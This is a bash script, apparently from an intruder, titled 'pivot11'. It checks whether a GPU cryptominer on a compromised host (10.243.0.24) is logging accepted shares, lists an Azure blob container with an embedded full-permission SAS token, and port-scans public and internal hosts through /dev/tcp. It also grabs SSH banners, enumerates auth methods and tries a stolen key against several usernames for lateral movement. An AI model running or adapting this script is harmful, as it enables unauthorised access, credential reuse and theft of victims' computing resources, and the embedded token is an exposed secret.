#!/bin/bash
# pivot11 - final doors: DNS/blob verdict, .24 kryptex accepted-share proof, offline-runner public reach+auth methods
exec >/tmp/pivot11-9927.txt 2>&1
set +e
say(){ echo; echo "==$1"; }
K=/tmp/kc/ibm_key.pem
SAS='sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D'
say M11-START-$(date -u +%s)

say Adns-runner
for n in github.com management.azure.com ulbatchkit4620.blob.core.windows.net blob.core.windows.net no-such-acct-zz9927.blob.core.windows.net prl.kryptex.network; do
  printf '%s -> ' "$n"; dig +short +time=3 +tries=1 "$n" 2>/dev/null | tr '\n' ' '; echo
done
echo "-- via 8.8.8.8"; for n in ulbatchkit4620.blob.core.windows.net github.com; do printf '%s -> ' "$n"; dig +short +time=4 +tries=1 @8.8.8.8 "$n" 2>&1 | tr '\n' ' '; echo; done
echo "-- blob curl verbose tail"
curl -sv -m 12 "https://ulbatchkit4620.blob.core.windows.net/kit?restype=container&comp=list&$SAS" 2>&1 | tail -6

say Bproof-24
ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24 '
 hostname; uptime | tr -s " "; nvidia-smi --query-gpu=name,memory.total,serial --format=csv,noheader
 sudo -n grep -ahoE "accepted \(|difficulty [0-9]+|[0-9]+\.[0-9]+ TH/s|spawn g[0-9]+" /var/log/t19/g0.log | tail -12
 echo "--accepted-count"; sudo -n grep -ac "accepted" /var/log/t19/g0.log
 echo "--logtail"; sudo -n tail -c 400 /var/log/t19/g0.log | tr -d "\r"
 echo "--sock"; ss -ltnp 2>/dev/null | grep -E "peakminer|:3334|:7048" | head -3
 echo "--dns"; getent hosts ulbatchkit4620.blob.core.windows.net; echo rc=$?' 2>&1 | tail -22

say Coffline-runner-public
ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24 '
 for hp in 20.240.55.118:22 20.205.187.223:22 20.205.187.223:10250 20.205.187.223:6443 20.205.187.223:9400 20.240.55.118:6443 20.240.55.118:9400 20.109.152.114:22; do
   ip=${hp%:*}; p=${hp##*:}
   if timeout 5 bash -c "echo >/dev/tcp/$ip/$p" 2>/dev/null; then echo "OPEN $hp"; else echo "SHUT $hp"; fi
   [ "$p" = 22 ] && timeout 6 bash -c "exec 3<>/dev/tcp/$ip/22; printf \"SSH-2.0-probe\r\n\" >&3; timeout 4 head -c 60 <&3 | tr -d \"\r\"" 2>/dev/null | head -1
 done
 echo "--authmethods x61/x76"
 for ip in 20.240.55.118 20.205.187.223; do timeout 8 ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 t19@$ip true 2>&1 | tail -1; done
 echo "--keytry x61/x76"
 for ip in 20.240.55.118 20.205.187.223; do for u in t19 ubuntu; do timeout 9 ssh -i /home/ubuntu/.ssh/ibmX.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes $u@$ip "echo SSHOK uid=\$(id -u) h=\$(hostname)" 2>&1 | tail -1; done; done' 2>&1 | tail -22

say Dauthmethods-subnet
for ip in 10.243.0.26 10.243.0.27 10.243.0.30 10.243.0.31; do
  printf '%s none-auth: ' $ip; timeout 8 ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 t19@$ip true 2>&1 | tail -1
done

say Ehostkeys
for ip in 10.243.0.24 10.243.0.26 10.243.0.27 10.243.0.29 10.243.0.30 10.243.0.31; do
  printf '%s ' $ip; timeout 6 ssh-keyscan -t ed25519 -T 4 $ip 2>/dev/null | awk '{print $2,substr($3,1,24)}'
done

say M11-END
